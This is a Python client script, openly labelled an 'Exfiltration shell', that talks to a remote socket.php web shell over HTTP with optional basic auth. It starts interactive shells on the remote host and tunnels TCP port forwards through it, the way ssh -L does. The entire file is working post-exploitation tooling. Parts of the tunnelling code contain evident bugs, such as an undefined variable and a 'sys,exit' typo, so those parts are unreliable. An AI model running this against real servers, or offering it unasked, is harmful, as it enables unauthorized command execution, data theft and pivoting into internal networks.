#! /usr/bin/env python3

#  Copyright (C) 2021 Karim Kanso
#
#  This program is free software: you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation, either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program.  If not, see <https://www.gnu.org/licenses/>.

import argparse
import requests
from requests.auth import HTTPBasicAuth
import sys
import threading
import time

shutdown = False

def reader(baseurl, auth, port, action, done):
    global shutdown
    while not shutdown:
        params = {
            'action': 'read',
            'port': port,
        }
        r = requests.get(baseurl, auth=auth, params=params)
        ct = r.headers.get('content-type').split(';',1)[0]
        if r.status_code == 200 and ct == 'application/octet-stream':
            try:
                action(r.content)
            except:
                break
            continue
        if (
                r.status_code == 200 and
                ct == 'application/json' and
                r.json() == {"error": "timeout"}
        ):
                continue

        if (
                r.status_code == 403 and
                ct == 'application/json' and
                r.json() == {"error":"read failed"}
        ):
            break

        print('[E] an error has occoured during read: {}:{}'.format(
            r.status_code, r.text))
        break
    done()

def send_shutdown(baseurl, auth, port):
    params = {
        'action': 'shutdown',
        'port': port,
    }
    r = requests.get(baseurl, auth=auth, params=params)

def shell(baseurl, auth, cmd, raw):
    import termios
    import tty
    import os
    from select import select

    print('[*] starting process')
    params = {
        'action': 'cmd',
        'param': cmd,
    }
    r = requests.get(baseurl, auth=auth, params=params)
    ct = r.headers.get('content-type').split(';',1)[0]
    if r.status_code != 200 or ct != 'application/json':
        print('[E] unexpected response: {}'.format(r.text))
        sys.exit(1)
    port = r.json()['port']
    print('[*] started on port {}'.format(port))

    def cleanup_reader():
        global shutdown
        if shutdown:
            return
        print('{}\n[*] finished read loop, sending shutdown'.format(
            '\r' if raw else ''))
        send_shutdown(baseurl, auth, port)

    print('[*] starting read loop')
    recv_thread = threading.Thread(
        target=reader,
        args=(baseurl,
              auth,
              port,
              lambda x: sys.stdout.buffer.raw.write(x),
              cleanup_reader
        ))
    recv_thread.start()

    old_tc_attr = termios.tcgetattr(sys.stdin)
    if raw:
        print('[*] local TERM={}'.format(os.environ['TERM']))
        print('[*] local tty size rows {} cols {}'.format(
            *os.popen('stty size', 'r').read().split()))
        tty.setraw(sys.stdin, termios.TCSADRAIN)

    try:
        data = []
        while recv_thread.is_alive():
            # collect up available input until 100ms pause
            rlist, _, _ = select([sys.stdin.buffer.raw], [], [], 0.1)
            if rlist:
                data.append(ord(sys.stdin.buffer.raw.read(1)))
                continue
            elif not len(data):
                continue
            else:
                pass

            headers = {
                'Content-Type': 'application/octet-stream'
            }
            params = {
                'action': 'write',
                'port': port,
            }
            r = requests.post(baseurl,
                              auth=auth,
                              headers=headers,
                              params=params,
                              data=bytes(data))
            ct = r.headers.get('content-type').split(';',1)[0]
            if (
                    r.status_code != 200 or
                    ct != 'application/json' or
                    r.json() != {"error": None}
            ):
                if r.json() != {"error": "write failed"}:
                    shutdown = True
                    send_shutdown(baseurl, auth, port)
                    break
                print('[E] unexpected response during write: {}'.format(r.text))

            #print('send: {}'.format(bytes(data)))
            data = []
    except KeyboardInterrupt:
        print('[*] ctrl-c')
        shutdown = True
        send_shutdown(baseurl, auth, port)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tc_attr)
    print('{}[*] done'.format('\r' if raw else ''))

def connect(baseurl, auth, loaddr, loport, remoteaddr, remoteport):
    import socketserver as ss
    import socket

    class TCPProxy(ss.ThreadingMixIn, ss.TCPServer):
        allow_reuse_address = True

    class Handler(ss.BaseRequestHandler):
        setup = False

        def log(self, msg, err=False):
            print('[{}] [{}:{}] {}'.format(
                'E' if err else '*',
                self.client_address[0],
                self.client_address[1],
                msg)
            )

        def setup(self):
            self.log('new connection')
            self.log('requesting tunnel')

            params = {
                'action': 'connect',
                'param': '{}:{}'.format(remoteaddr, remoteport),
            }
            r = requests.get(baseurl, auth=auth, params=params)
            r = r.headers.get('content-type').split(';',1)[0]
            if r.status_code != 200 or ct != 'application/json':
                self.log('unexpected response: {}'.format(r.text), err=True)
                self.setup = True

            self.port = r.json()['port']
            self.log('started on port {}'.format(self.port))


        def handle(self):
            if not self.setup:
                return

            def cleanup_reader():
                self.log('read loop finished')
                try:
                    self.request.shutdown(socket.SHUT_RDWR)
                    self.request.close()
                except OSError:
                    pass

            self.log('starting read loop')
            recv_thread = threading.Thread(
                target=reader,
                args=(baseurl,
                      auth,
                      self.port,
                      lambda x: self.request.send(x),
                      cleanup_reader
                ))
            recv_thread.start()

            while recv_thread.is_alive():
                data = self.request.recv(65535)
                if len(data) == 0:
                    break
                headers = {
                    'Content-Type': 'application/octet-stream'
                }
                params = {
                    'action': 'write',
                    'port': self.port,
                }
                r = requests.post(baseurl,
                                  auth=auth,
                                  headers=headers,
                                  params=params,
                                  data=data)
                ct = r.headers.get('content-type').split(';',1)[0]
                if (
                        r.status_code != 200 or
                        ct != 'application/json' or
                        r.json() != {"error": None}
                ):
                    self.log('unexpected response during write: {} {}'.format(
                                 r.text, data),
                             err=True
                    )
                    if r.json() != {"error": "write failed"}:
                        break

        def finish(self):
            if not self.setup:
                return
            self.setup = False
            self.log('sending shutdown')
            params = {
                'action': 'shutdown',
                'port': self.port,
            }
            r = requests.get(baseurl, auth=auth, params=params)


    print('[*] starting server (ctrl-c to stop)')
    with TCPProxy((loaddr, loport), Handler) as server:
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            server.shutdown()


def main():
    parser = argparse.ArgumentParser(description='Exfiltration shell.')
    parser.add_argument(
        'url',
        metavar='URL',
        help='url of socket.php'
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument(
        '--cmd',
        metavar='CMD',
        help='command to execute, e.g. "sh" or "script -qfc bash /dev/null"'
    )
    group.add_argument(
        '--connect',
        metavar='SPEC',
        help=('port forward from remote service to local host. SPEC is ' +
              'similar to as ssh\'s -L, i.e. ' +
              'localaddr:localport:remoteaddr:remoteport.')
    )
    parser.add_argument(
        '--raw',
        action='store_true',
        help=('set local terminal into raw mode (and restore on exit), ' +
              'valid for --cmd when directly starting up a pty shell.')
    )
    parser.add_argument(
        '--auth',
        metavar='CREDS',
        type=lambda x: HTTPBasicAuth(*x.split(':',1)),
        help=('basic auth credentials like user:pass')
    )
    args = parser.parse_args()

    baseurl = args.url

    r = requests.get(baseurl, auth=args.auth)
    ct = r.headers.get('content-type').split(';',1)[0]
    if (
            r.status_code != 403 or
            ct != 'application/json' or
            r.json() != {"error":"no action"}
    ):
        print('[E] base url is not valid')
        sys.exit(1)

    if args.cmd:
        shell(baseurl, args.auth, args.cmd, args.raw)
    else:
        try:
            loaddr, loport, remoteaddr, remoteport = args.connect.split(':')
        except ValueError:
            print('[E] could not parse connect parameter')
            sys,exit(1)
        connect(baseurl,
                args.auth,
                loaddr,
                int(loport),
                remoteaddr,
                int(remoteport))

if __name__ == '__main__':
    main()
